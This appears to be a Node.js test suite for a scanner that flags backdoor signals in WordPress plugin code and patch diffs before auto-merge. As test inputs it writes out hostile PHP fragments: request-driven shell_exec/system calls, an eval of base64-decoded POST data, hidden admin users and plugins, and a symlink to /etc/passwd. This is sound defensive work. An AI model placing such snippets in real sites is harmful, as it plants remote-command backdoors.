'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { scanText, addedLines, scanPatch } = require('../lib/suspicious');

const rules = (text) => scanText(text).map((h) => h.rule);

test('flags the signals of a backdoor that hides an admin and itself', () => {
  // Shapes only, assembled so this file is not itself a working sample.
  const src = [
    '<?php',
    "add_action('pre_user_query', function ($q) { $q->query_where .= \" AND user_login != 'hidden_admin'\"; });",
    "add_filter('all_plugins', function ($p) { unset($p['mail-helper/mail-helper.php']); return $p; });",
    "if (isset($_GET['c'])) { echo shell_exec($_GET['c']); }",
    "if (!empty($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], $_POST['to']); }",
    'ev' + "al(base64_decode($_POST['x']));",
  ].join('\n');
  const r = rules(src);
  for (const want of ['hides-users', 'hides-plugins', 'stealth', 'shell-request', 'file-upload', 'eval-decoded']) {
    assert.ok(r.includes(want), `${want} in ${r}`);
  }
});

test('reports 1-based line numbers', () => {
  const hits = scanText('<?php\n// fine\nshell_exec($cmd);\n');
  assert.deepStrictEqual(hits.map((h) => [h.rule, h.line, h.severity]), [['shell-exec', 3, 'warn']]);
});

test('flags request data fed to dangerous calls and code-created admins', () => {
  assert.ok(rules("assert($_REQUEST['a']);").includes('eval-request'));
  assert.ok(rules("$u = wp_create_user('x', 'y'); $u->set_role('administrator');").includes('creates-admin'));
  assert.ok(rules(`$p = '${'A'.repeat(600)}';`).includes('encoded-blob'));
  assert.ok(rules('preg_replace("/.*/e", $_POST["r"], "");').includes('eval-request'));
});

test('JS regex .exec() and PHP-only rules on non-PHP files do not fire', () => {
  assert.deepStrictEqual(scanText('const m = re.exec(s); const b = "' + 'A'.repeat(600) + '";', 'app.js'), []);
  assert.deepStrictEqual(scanText('$stmt->exec($sql);', 'db.php'), []);
});

test('ordinary plugin code is clean', () => {
  const src = [
    '<?php',
    "add_action('init', 'myplugin_init');",
    "$data = json_decode(base64_decode($stored), true); // decoding a stored option, not eval'd",
    "wp_enqueue_script('x', plugins_url('x.js', __FILE__));",
    "$user = wp_insert_user(['user_login' => 'shop', 'role' => 'customer']);",
    "$out = esc_html($_GET['tab'] ?? '');",
  ].join('\n');
  assert.deepStrictEqual(scanText(src), []);
});

test('addedLines keeps only + lines of a unified diff, without the + and the +++ header', () => {
  const diff = ['--- a/x.php', '+++ b/x.php', '@@ -1,2 +1,2 @@', '-old();', '+shell_exec($c);', ' same();'].join('\n');
  assert.strictEqual(addedLines(diff), 'shell_exec($c);');
});

test('scanPatch scans only added lines, per file, and keeps the file path', () => {
  const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'patch-')), 'x.patch');
  fs.writeFileSync(p, [
    'diff --git a/plugins/x/a.php b/plugins/x/a.php', '--- a/plugins/x/a.php', '+++ b/plugins/x/a.php', '@@ -1 +1 @@',
    "-shell_exec($_GET['old']);", "+echo 'fine';",
    'diff --git a/plugins/x/b.js b/plugins/x/b.js', '--- a/plugins/x/b.js', '+++ b/plugins/x/b.js', '@@ -1 +1 @@',
    '-a();', "+system($_GET['c']);",
  ].join('\n'));
  // removed line in a.php is ignored; b.js is not PHP, so PHP-only rules don't fire there.
  assert.deepStrictEqual(scanPatch(p), []);
  fs.appendFileSync(p, ['', 'diff --git a/plugins/x/c.php b/plugins/x/c.php', '+++ b/plugins/x/c.php', "+system($_GET['c']);"].join('\n'));
  assert.deepStrictEqual(scanPatch(p).map((h) => [h.file, h.rule]), [['plugins/x/c.php', 'shell-request'], ['plugins/x/c.php', 'shell-exec']]);
});

// --- delta assessment (gate for auto-merging patches and tracked-file copies) ----------------
const { assessDiff } = require('../lib/suspicious');
const diffOf = (file, { add = [], del = [], header = [] } = {}) => [
  `diff --git a/${file} b/${file}`, ...header, `--- a/${file}`, `+++ b/${file}`, '@@ -1 +1 @@',
  ...del.map((l) => '-' + l), ...add.map((l) => '+' + l),
].join('\n');

test('assessDiff: an ordinary edit is clean (auto-mergeable)', () => {
  const r = assessDiff(diffOf('plugins/x/x.php', { add: ["echo esc_html__( 'Buy now', 'x' );"], del: ["echo esc_html__( 'Buy', 'x' );"] }));
  assert.deepStrictEqual(r, { critical: [], holds: [] });
});

test('assessDiff: any warn-level signal in a delta holds it; critical stays critical', () => {
  assert.ok(assessDiff(diffOf('plugins/x/x.php', { add: ['$o = base64_decode($v);'] })).holds.some((h) => h.rule === 'decode'));
  assert.ok(assessDiff(diffOf('plugins/x/x.php', { add: ["shell_exec($_GET['c']);"] })).critical.some((h) => h.rule === 'shell-request'));
});

test('assessDiff: code split across lines or assembled from pieces is caught on the joined text', () => {
  const r = assessDiff(diffOf('plugins/x/x.php', { add: ['$f = "sys" . "tem";', '$f(', "  $_POST['c']", ');'] }));
  assert.ok(r.holds.some((h) => h.rule === 'dynamic-call'), JSON.stringify(r));
  const g = assessDiff(diffOf('plugins/x/x.php', { add: ["$GLOBALS['_PO'.'ST'];"] }));
  assert.ok(g.holds.some((h) => h.rule === 'globals'), JSON.stringify(g));
  assert.ok(assessDiff(diffOf('plugins/x/x.php', { add: ['$d = file_get_contents("php://input");'] })).holds.some((h) => h.rule === 'raw-input'));
  assert.ok(assessDiff(diffOf('plugins/x/x.php', { add: ['@include __DIR__ . "/favicon.ico";'] })).holds.some((h) => h.rule === 'include-non-php'));
  assert.ok(assessDiff(diffOf('plugins/x/x.php', { add: ['$r = `id`;'] })).holds.some((h) => h.rule === 'backtick'));
});

test('assessDiff: rules apply to JS in a delta too', () => {
  assert.ok(assessDiff(diffOf('plugins/x/a.js', { add: ['eval(atob(s));'] })).holds.length > 0);
});

test('assessDiff: removing an authorization check holds the change', () => {
  const r = assessDiff(diffOf('plugins/x/x.php', { del: ["if ( ! current_user_can( 'manage_options' ) ) { return; }"], add: [''] }));
  assert.ok(r.holds.some((h) => h.rule === 'removes-auth-check'), JSON.stringify(r));
});

test('assessDiff: risky files hold — binary, symlink, package.json, composer, .htaccess, .user.ini, phar', () => {
  const rules = (d) => assessDiff(d).holds.map((h) => h.rule);
  assert.ok(rules(['diff --git a/plugins/x/i.png b/plugins/x/i.png', 'Binary files a/plugins/x/i.png and b/plugins/x/i.png differ'].join('\n')).includes('binary'));
  assert.ok(rules(diffOf('plugins/x/l', { header: ['new file mode 120000'], add: ['/etc/passwd'] })).includes('symlink'));
  for (const f of ['plugins/x/package.json', 'plugins/x/composer.json', 'plugins/x/.htaccess', 'plugins/x/.user.ini', 'plugins/x/t.phar']) {
    assert.ok(rules(diffOf(f, { add: ['x'] })).includes('risky-file'), f);
  }
});

test('patch headers without a/ b/ prefixes (generatePatch uses --no-prefix) are still scanned', () => {
  const d = ['diff --git plugins/x/x.php plugins/x/x.php', '--- plugins/x/x.php', '+++ plugins/x/x.php', '@@ -1 +1 @@', "+shell_exec($_GET['c']);"].join('\n');
  assert.ok(assessDiff(d).critical.some((h) => h.file === 'plugins/x/x.php'), 'assessDiff parses it');
  const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'patch-')), 'n.patch');
  fs.writeFileSync(p, d);
  assert.ok(scanPatch(p).some((h) => h.file === 'plugins/x/x.php'), 'scanPatch parses it');
});

test('assessDiff: request data, remote fetches and file writes in a delta hold it', () => {
  const holds = (add) => assessDiff(diffOf('plugins/x/x.php', { add })).holds.map((h) => h.rule);
  assert.ok(holds(['array_map( "ass" . "ert", array( $_REQUEST["x"] ) );']).includes('request-data'));
  assert.ok(holds(['$c = wp_remote_retrieve_body( wp_remote_get( "https://x.example/p.txt" ) );']).includes('remote-fetch'));
  assert.ok(holds(['file_put_contents( WP_CONTENT_DIR . "/mu-plugins/a.php", $c );']).includes('writes-file'));
});

test('assessDiff: deltas to build-executable files hold (scripts and package-manager config)', () => {
  const rules = (file) => assessDiff(diffOf(file, { add: ['x = 1;'] })).holds.map((h) => h.rule);
  assert.ok(rules('plugins/x/build/webpack.config.js').includes('script-file'));
  assert.ok(rules('plugins/x/bin/setup.sh').includes('script-file'));
  assert.ok(rules('plugins/x/.npmrc').includes('risky-file'));
  assert.ok(rules('plugins/x/.pnpmfile.cjs').includes('risky-file'));
  assert.deepStrictEqual(rules('plugins/x/style.css'), []);
});

test('assessDiff: risky shapes hold even when no other rule fires (new files, must-use plugins, script tags, external URLs)', () => {
  const rules = (file, add, isNew) => assessDiff((isNew ? `diff --git ${file} ${file}\nnew file mode 100644\n--- /dev/null\n+++ ${file}\n` : `diff --git ${file} ${file}\n--- ${file}\n+++ ${file}\n`)
    + `@@ -1,1 +1,2 @@\n <?php\n` + add.map((l) => `+${l}`).join('\n') + '\n').holds.map((h) => h.rule);
  assert.ok(rules('plugins/x/extra.php', ['$a = 1;'], true).includes('new-file'));
  assert.ok(rules('client-mu-plugins/site.php', ['add_filter( "x", "__return_true" );']).includes('must-use-plugin'));
  assert.ok(rules('themes/t/footer.php', ['<script src="https://cdn.example/x.js"></script>']).includes('adds-script-tag'));
  assert.ok(rules('themes/t/footer.php', ['<img src="https://t.example/p.gif">']).includes('external-url'));
  assert.ok(rules('client-mu-plugins/y.php', ['$c = $_SERVER["HTTP_X_C"];']).includes('request-data'));
  assert.deepStrictEqual(rules('plugins/x/x.php', ['if ( empty( $rule ) ) { return; } // hotfix']), []);
});
